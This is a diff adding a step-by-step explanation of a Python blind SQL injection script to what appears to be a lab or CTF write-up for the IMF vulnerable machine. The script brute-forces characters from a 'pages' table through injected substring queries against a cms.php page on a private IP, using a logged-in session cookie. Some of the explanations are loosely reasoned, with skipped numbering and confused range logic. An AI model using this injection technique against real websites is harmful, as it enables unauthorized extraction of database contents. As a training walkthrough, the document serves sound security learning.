@@ -753,6 +753,201 @@ if __name__ == '__main__':
 ```
 
 
-where:
+where: Program Logic 
+1
+```python3
+#!/usr/bin/python3
+```
+is the header, like the "magic numbers", that indicates, for example, to Python that the file should be interpreted as a Python file and that its extension should be .py
+
+2
+```python3
+from pwn import *
+import requests, pdb, signal, time, sys, string
+```
+basically is importing the library called pwn which will allow us to use pwn tools to play with progress bars and other things.
+
+3
+```python
+def def_handler(sig,frame):
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1)
+```
+5
+
+```python
+import requests, pdb, signal, time, sys, string
+```
+requests: basically importing requests which will allow us to send requests to a webpage.
+
+pdb: for applying debugging.
+
+signal: for handling Ctrl+C to terminate the program and control program flow.
+
+time: The Python library "time" provides functions related to time, such as time measurement, time conversion, waiting or pausing, etc. Some of the common functions of the "time" library are: time(), sleep(), strftime(), gmtime(), etc.
+
+sys: The "sys" library in Python provides access to some variables and functions used or maintained by the Python interpreter. Some of the common functions and variables of the "sys" library are: argv, exit(), stdin, stdout, stderr, etc. Additionally, this library is used for performing some low-level operations related to the system, such as manipulation of command-line arguments, interaction with the operating system, manipulation of environment variables, etc.
+
+string: to represent characters in our script."
+
+
+6
+
+```python
+def def_handler(sig,frame):
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1)
+
+
+# Ctrl+C
+signal.signal(signal.SIGINT, def_handler)
+```
+
+def def_handler(sig,frame):
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1) : 
+    
+Then, since the function is named "def_handler", we need to define it above the signal.
+
+Before importing it, we must define the "def_handler" function.
+
+The function needs to receive 2 values, sig and frame, to avoid issues.
+
+And when we use control c, I need you to print "Exiting" on the screen.
+
+The "sys.exit" is used so that when I press control c, it will execute with an error status code. This will cause the program flow to stop and be interrupted. 
+
+signal.signal(signal.SIGINT, def_handler): Since we will be in the brute-force process, it is possible that we will need to use Ctrl+C. Therefore, since we have imported 'signal', we will use it.
+
+
+7
+
+```python
+#Variables Globales
+main_url = "http://192.168.100.52/imfadministrator/cms.php?pagename=home"
+characters = string.ascii_lowercase + '-_'
+```
+
+We need to define global variables where we are going to apply the injection, which would be the IP address we are going to inject and the URL where the vulnerability exists. The characters that we want to fuzz are up to our preference, as we imported the string library, we can use lowercase characters. To check, we can open Python3 and type "import string" then "string.ascii_lowercase" to see which characters we are going to fuzz. However, if we want to add numbers, we can use "+" and import the number library "string.digits" as an example "characters = string.ascii_lowercase + string.digits". Similarly, if we want to add special characters, we could add "+ string.punctuation".
+
+
+8
+
+```python
+def makeRequest(): 
+```
+So, how would we do it? You are fuzzing for the variable (schema_name,1,1) to select both the database and its order, and this is equal to 1'. Therefore, we would have to make a triple nested loop since we are fuzzing for the schema variables, the table position, and the word to fuzz.
+
+9
+
+```python
+ cookies = {'PHPSESSID': 'u85u4l0h0cho9ug97gqspsubp3'}
+```
+Let's remember that we are logged in, so we will need to add our session. In my case, it would be this one.
+
+10
+
+```python
+database = ""
+```
+This variable will be explained in more detail below as to why it is empty.
+
+11
+
+```python
+p1 =log.progress("Fuerza bruta")
+```
+This progress bar will continuously display the injection we will be applying, so we can see at all times where we are at.
+
+12
+
+```python
+ p1.status("Iniciando proceso de fuerza bruta")
+```
+basically prints that string.
+
+13
+
+```python
+time.sleep(2)
+```
+This is a command that pauses the execution of the program for a certain number of seconds. In this context, it is used so that the user can clearly see that the program is performing the fuzzing process in real time.
+
+14
+
+```python
+p2 = log.progress("Databases")
+```
+
+This is where it will be editing the "Databases" variable that we defined above and it will be updating the name of the currently fuzzed DB in real-time.
+
+15
+
+```python
+  for dbs in range(0, 6):
+        for position_character in range(1, 30): 
+            for character in characters:
+                sqli = main_url + f"'+and+(select+substring(pagename,{position_character},1)+from+pages+limit+{dbs},1)='{character}"
+```
+where
+
+for dbs in range(0, 6): For the databases, we will define a range from 0 to 5 because if we put 6, when we print it will only interpret 5. So we will search within a range of 5, based on the count we made.
+
+for position_character in range(1, 30): We will search from 0 to 30 assuming that the total number of characters in a database is not greater than 30. For example, SQL database names are 3 characters long, so if we only want to search for those, we can search from 0 to 30.
+
+for character in characters: Here, we will fuzz by characters, as we mentioned earlier that we will use lowercase letters, underscores, and we can also add numbers if we want.
+
+sqli = main_url + f"'+and+(select+substring(pagename,{position_character},1)+from+pages+limit+{dbs},1)='{character}": With this line, we will define the SQL injection. It is basically what the program's flow sends. Here we can search by databases, tables, or columns depending on what we want. Instead of using variables like %d or %s, we will add f and then represent our search with {position_character} because we will search for characters.
+
+16
+
+```python
+p1.status(sqli)
+```
+We are going to define this progress bar to see the progress of sqli.
+
+17
+
+
+```python
+r = requests.get(sqli, cookies=cookies)
+```
+
+We are going to store the response in r so that it shows us the response at all times. With requests, we tell it to process the request through GET to main_url, which we have already defined. As we defined in sqli as main_url + f, we are also defining here what it should do, which is to make a GET request to main_url with the previously assigned session cookie.
+
+18
+
+```python
+    if "Welcome to the IMF Administration." in r.text:
+                    database += character
+                    p2.status(database)
+                    break
+
+```
+Here we are telling that when if ```Welcome to the IMF Administration.``` is true, then it means that the character we fuzzed is correct, and the response is coming from the server side.
+
+
+19
+
+```python
+database += ","   
+```
+
+
+
+20
+```python
+if __name__ == '__main__':
+```
+Here we indicate where the program flow starts.
+Now we are going to define a function called "make_request".
+
+21
+
+```python
+ makeRequest()
+```
+
+
 
 exp
